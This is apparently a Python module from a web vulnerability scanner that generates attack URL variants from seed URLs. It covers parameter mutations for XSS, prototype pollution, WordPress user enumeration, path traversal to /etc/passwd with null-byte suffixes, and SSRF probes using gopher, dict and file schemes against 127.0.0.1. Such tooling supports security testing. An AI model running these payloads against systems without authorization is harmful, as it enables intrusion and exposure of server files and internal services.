from urllib.parse import urlparse, parse_qs, urlunparse, urlencode
import copy

class MutationEngine:
    """
    Core engine for generating high-value attack variants from base seeds.
    Implements RedOps2-style aggressive parameter and structure mutations.
    """
    def __init__(self, budget_manager=None, logger=None):
        self.budget = budget_manager
        self.log = logger
        
    def generate_variants(self, seed_url, attack_type="generic", strategy=None):
        """
        Generates variants for a specific attack type, optionally guided by a context strategy.
        Supported types: xss, lfi, ssrf, sqli, openredirect
        """
        variants = []
        parsed = urlparse(seed_url)
        query = parse_qs(parsed.query)
        
        # Merge extra params from strategy if applicable
        if strategy and strategy.get("extra_params"):
            for p in strategy["extra_params"]:
                if p not in query:
                    query[p] = ["ROXSS123"] # Initial seed for mutation

        if not query:
            return [{"url": seed_url, "mutations": ["original"], "mutation_type": "original"}]

        if attack_type == "xss":
            variants.extend(self._mutate_xss(parsed, query, strategy))
        elif attack_type == "lfi":
            variants.extend(self._mutate_lfi(parsed, query, strategy))
        elif attack_type == "ssrf":
            variants.extend(self._mutate_ssrf(parsed, query, strategy))
        else:
            # Generic/Default
            variants.append({"url": seed_url, "mutations": ["original"], "mutation_type": "generic"})
            
        if self.log and self.budget:
            self.log(f"MutationEngine: generated={len(variants)} after_budget={self.budget.preserved_variants} (dropped={self.budget.dropped_duplicates})", "DEBUG")

        return variants


    def _mutate_xss(self, parsed, query, strategy=None):
        results = []
        
        # 1. Standard mutations
        for param in query:
            new_query = copy.deepcopy(query)
            val = new_query.pop(param)
            new_query[f"{param}[]"] = val
            variant = self._build_variant(parsed, new_query, [f"array_wrap:{param}"], mutation_type="xss")
            
            if not self.budget or self.budget.can_add_variant(variant["url"], "xss"):
                results.append(variant)
                if self.budget: self.budget.track_variant()

        # 2. JSON/Node mutations if strategy enabled
        if strategy and strategy.get("enable_json_mutations"):
            for p in ["__proto__", "constructor", "prototype"]:
                new_query = copy.deepcopy(query)
                new_query[p] = ["{\"polluted\":\"true\"}"]
                variant = self._build_variant(parsed, new_query, [f"proto_pollution:{p}"], mutation_type="proto_pollution")
                if not self.budget or self.budget.can_add_variant(variant["url"], "proto_pollution"):
                    results.append(variant)
                    if self.budget: self.budget.track_variant()

        # 3. WordPress specific routes if strategy enabled
        if strategy and strategy.get("enable_wp_routes"):
            new_query = copy.deepcopy(query)
            new_query["rest_route"] = ["/wp/v2/users"]
            variant = self._build_variant(parsed, new_query, ["wp_rest_route"], mutation_type="wp_route")
            if not self.budget or self.budget.can_add_variant(variant["url"], "wp_route"):
                results.append(variant)
                if self.budget: self.budget.track_variant()

        # Mutation 2: Empty/Null probes
        for param in query:
            new_query = copy.deepcopy(query)
            new_query[param] = [""]
            variant = self._build_variant(parsed, new_query, [f"null_probe:{param}"], mutation_type="xss_null")
            if not self.budget or self.budget.can_add_variant(variant["url"], "xss_null"):
                results.append(variant)
                if self.budget: self.budget.track_variant()
                
        # Mutation 3: Simple probe injection
        results.append({"url": urlunparse(parsed), "mutations": ["original"], "mutation_type": "original"})
        
        return results

    def _mutate_lfi(self, parsed, query, strategy=None):
        results = []
        lfi_keywords = ["file", "path", "page", "template", "include", "doc", "view"]
        
        traversals = ["../../../../etc/passwd"] if strategy and strategy.get("enable_lfi") else []

        for param in query:
            is_lfi_target = any(kw in param.lower() for kw in lfi_keywords)
            if is_lfi_target:
                for ext in [".php", ".html", "%00"]:
                    new_query = copy.deepcopy(query)
                    new_query[param] = [f"{new_query[param][0]}{ext}"]
                    variant = self._build_variant(parsed, new_query, [f"lfi_ext:{ext}"], mutation_type="lfi")
                    if not self.budget or self.budget.can_add_variant(variant["url"], "lfi"):
                        results.append(variant)
                        if self.budget: self.budget.track_variant()
                
                for trav in traversals:
                    new_query = copy.deepcopy(query)
                    new_query[param] = [trav]
                    variant = self._build_variant(parsed, new_query, ["lfi_traversal"], mutation_type="lfi")
                    if not self.budget or self.budget.can_add_variant(variant["url"], "lfi"):
                        results.append(variant)
                        if self.budget: self.budget.track_variant()
        
        if not results:
            results.append({"url": urlunparse(parsed), "mutations": ["original"], "mutation_type": "original"})
        return results

    def _mutate_ssrf(self, parsed, query, strategy=None):
        results = []
        ssrf_keywords = ["url", "uri", "dest", "domain", "host", "callback", "path"]
        
        for param in query:
            if any(kw in param.lower() for kw in ssrf_keywords):
                schemes = ["http", "https"]
                if strategy and strategy.get("enable_ssrf"):
                    schemes.extend(["gopher", "dict", "file"])

                for scheme in schemes:
                    new_query = copy.deepcopy(query)
                    new_query[param] = [f"{scheme}://127.0.0.1"]
                    variant = self._build_variant(parsed, new_query, [f"ssrf_scheme:{scheme}"], mutation_type="ssrf")
                    if not self.budget or self.budget.can_add_variant(variant["url"], "ssrf"):
                        results.append(variant)
                        if self.budget: self.budget.track_variant()
                            
        if not results:
            results.append({"url": urlunparse(parsed), "mutations": ["original"], "mutation_type": "original"})
        return results

    def _build_variant(self, parsed, query_dict, mutation_list, mutation_type="generic"):
        new_query_str = urlencode(query_dict, doseq=True)
        new_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query_str, parsed.fragment))
        return {"url": new_url, "mutations": mutation_list, "mutation_type": mutation_type}

